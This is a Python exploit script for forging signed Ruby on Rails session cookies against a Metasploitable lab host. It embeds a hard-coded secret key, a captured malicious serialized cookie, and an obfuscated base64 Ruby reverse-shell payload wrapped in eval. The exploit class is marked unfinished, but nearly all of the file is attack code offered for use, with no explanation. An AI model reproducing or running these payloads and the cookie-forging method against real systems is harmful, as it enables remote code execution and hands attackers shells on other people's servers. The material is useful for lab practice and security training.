#!/usr/bin/env python3

import requests
import argparse
import hashlib
import hmac
from Crypto.Hash import SHA1, HMAC
from base64 import b64encode, urlsafe_b64encode, standard_b64encode
from urllib.parse import urlencode

"""
Cookie: _metasploitable=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQc6DkBpbnN0YW5jZW86CEVSQgc6CUBzcmMiAqcEZXZhbCgnWTI5a1pTQTlJQ2RaTWpscldsTkJPVWxEVlc5Wk1qRlhaVWRTV0dKSWJHRlZNRVoxV1hwSk5XRnRSWGxXYWtKTFpXNVNjVlZHV2xOU1JsWkhWRzVhV2sxdVVuTmFSVTB4WkZad1dWa3lPVXBoYTFVeFZGZHJNR1ZGTlhGYU0xWlBWa1pzTVZSV1RrcGpNR3hGVlZSQ1QxSkdSbmRVTTJ4VFpXMVNTRlZ1UW1saFZGWTFWMnhqTldReGNGaE9SemxhWlZkek0xTnJhRTlOUm5CSVQxUkdhMUY2VmpWWGJHTTFaREZ3V0U1SE9WcGxWM016VTJ0b1QwMUdjRWhXYm14cVlWUldOVmRzWXpWa01YQllUa2M1V21WWGN6TlRhMmhQVFVad1NHSklWazFpVmxwdlYxUktiMXB0U2toaVNGWmhWMGhSTkZscmFEUmpNVUpZWkROV2FrMHhTalZaVm1oQ1RqSktkRlpxVW10Uk1FcDNWMjFzUTJNd2VIUmxSM2hwWWxkUmQxbFZVWGRQVlRGRll6STVWRlpVYURGWk1HTTFaREZ3V0U1SE9XbFJNMlJ3V1RJeFNtRlZkRmxrUkdoaFlsWkpORk5WWkdGaE1IaDBWbTFvV2sxdGFHMVphMlJ6WkZad1ZGRnFaRzFTZW1zMFUxVmtUbVJYVGtsV2FrSnFaVmRvTWxSSE5VOU5SMDUwWWtoa1RGVXdTVFZhYkU1eVdqSk9kRlp1Y0ZwTk1WcHpVMVZqTVdOSFNrUlJhbXR3VEc1V2RXTkhSbXBoZVdkc1MwY3dkMHRUYTNWYWJXeDVZek5SUzJGWFdXZFZiRlpEVjFZNVVWUkZSbFZTYXpsVFZGTkJPV1pwUVhaaVdFNHpZVmMxT0dKWGJIVmFNMlE0WkRKc2RVMTZTWFpEYld4MVkwTkJPVWxGYkZCTWJrSjJZMGRXZFV0RFZXOWpibFpwWlZOcmMwbERWVzlrTWtsd1MxTkNlVnBZVG1wa1YxVm5ZbTFzYzBOdGJHMUpSMngxWTBGd2NHSnVRWFZrTTBwd1pFZFZiMWt5T1d0YVUydExZVmMxZDB4dFRuTmlNMDVzUTIxV2RWcEJjR3hpU0U1c1EyMXNiVWxEUldkVlNFcDJXVEpXZW1ONU5XMWlNMHB5UzBOclMxcFlXbWhpUTJocVlqSlNiRXRUUW5sYVdFNXFaRmRWWjJKdGJITkRiVloxV2tGd2JHSnRVVDBuTG5WdWNHRmpheWdpYlRBaUtTNW1hWEp6ZEFwcFppQlNWVUpaWDFCTVFWUkdUMUpOSUQxK0lDOXRjM2RwYm54dGFXNW5kM3gzYVc0ek1pOEthVzV3SUQwZ1NVOHVjRzl3Wlc0b0luSjFZbmtpTENBaWQySWlLU0J5WlhOamRXVWdibWxzQ21sbUlHbHVjQXBwYm5BdWQzSnBkR1VvWTI5a1pTa0thVzV3TG1Oc2IzTmxDbVZ1WkFwbGJITmxDa3RsY201bGJDNW1iM0pySUdSdkNtVjJZV3dvWTI5a1pTa0taVzVrQ21WdVpBcDdmUT09Jy51bnBhY2soJ20wJykuZmlyc3QpOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdA%3d%3d--3f6081c51a7d9eaa7ad1246422b17db1a548131b
"""

ruby_reverse = "eval(%(Y29kZSA9ICUoY21WeGRXbHlaU0FuYzI5amEyVjBKenRqUFZSRFVGTnZZMnRsZEM1dVpYY29JakV3TGpjdU5EZ3VNVE0ySWl3Z05EUTBOQ2s3SkhOMFpHbHVMbkpsYjNCbGJpaGpLVHNrYzNSa2IzVjBMbkpsYjNCbGJpaGpLVHNrYzNSa1pYSnlMbkpsYjNCbGJpaGpLVHNrYzNSa2FXNHVaV0ZqYUY5c2FXNWxlM3hzZkd3OWJDNXpkSEpwY0R0dVpYaDBJR2xtSUd3dWJHVnVaM1JvUFQwd095aEpUeTV3YjNCbGJpaHNMQ0p5WWlJcGUzeG1aSHdnWm1RdVpXRmphRjlzYVc1bElIdDhiM3dnWXk1d2RYUnpLRzh1YzNSeWFYQXBJSDE5S1NCeVpYTmpkV1VnYm1sc0lIMD0pLnVucGFjayglKG0wKSkuZmlyc3QKaWYgUlVCWV9QTEFURk9STSA9fiAvbXN3aW58bWluZ3d8d2luMzIvCmlucCA9IElPLnBvcGVuKCUocnVieSksICUod2IpKSByZXNjdWUgbmlsCmlmIGlucAppbnAud3JpdGUoY29kZSkKaW5wLmNsb3NlCmVuZAplbHNlCmlmICEgUHJvY2Vzcy5mb3JrKCkKZXZhbChjb2RlKSByZXNjdWUgbmlsCmVuZAplbmQ=).unpack(%(m0)).first)"


class RubyonRailsExploit:
    # NOT FINISHED
    def __init__(self, host, port):
        self.__host = host
        self.__port = port
        self.__requests = requests.session()
        self.__version = 3
        self.__path = "/flag"
        self.__name = "_metasploitable"
        self.__secret = bytes("a7aebc287bba0ee4e64f947415a94e5f", "utf-8")

    def __craft(self):
        self.__msg = bytes("ls -lart", "utf-8")
        self.__digest = HMAC.new(self.__secret, self.__msg, SHA1).hexdigest()
        # self.__digest = hmac.new(self.__secret, self.__msg, hashlib.sha1).hexdigest()
        self.__data = str(urlsafe_b64encode(self.__msg), "utf-8")
        self.__cookie = f"{self.__data}--{self.__digest}"
        # self.__cookie = str(urlsafe_b64encode(bytes(self.__data, 'utf-8')), 'utf-8')

    def __retrieve(self):
        r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
        print(r.headers)
        for i in r.cookies:
            print(f"Cookie: {i.name}")
            if self.__cookie in i.name:
                print(f"Cookie: {i.name} Value: {i.value}")

    def __exploit(self):
        sploit = {"Cookie": f"{self.__name}={self.__cookie}"}
        print(f"Cookie: {self.__cookie}")
        r = self.__requests.get(
            f"http://{self.__host}:{self.__port}{self.__path}", headers=sploit
        )
        print(r.text)
        return False

    def run(self):
        self.__craft()
        return self.__exploit()


def main(args):
    print("[+] Metasploitable Ruby on Rails Secret Cookie exploit by xentrick")
    print("[+] Exploiting " + args.host + ":" + args.port)

    exploit = RubyonRailsExploit(args.host, int(args.port))
    if exploit.run():
        print("Target exploited")
    else:
        print("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True)
    args = parser.parse_args()

    main(args)
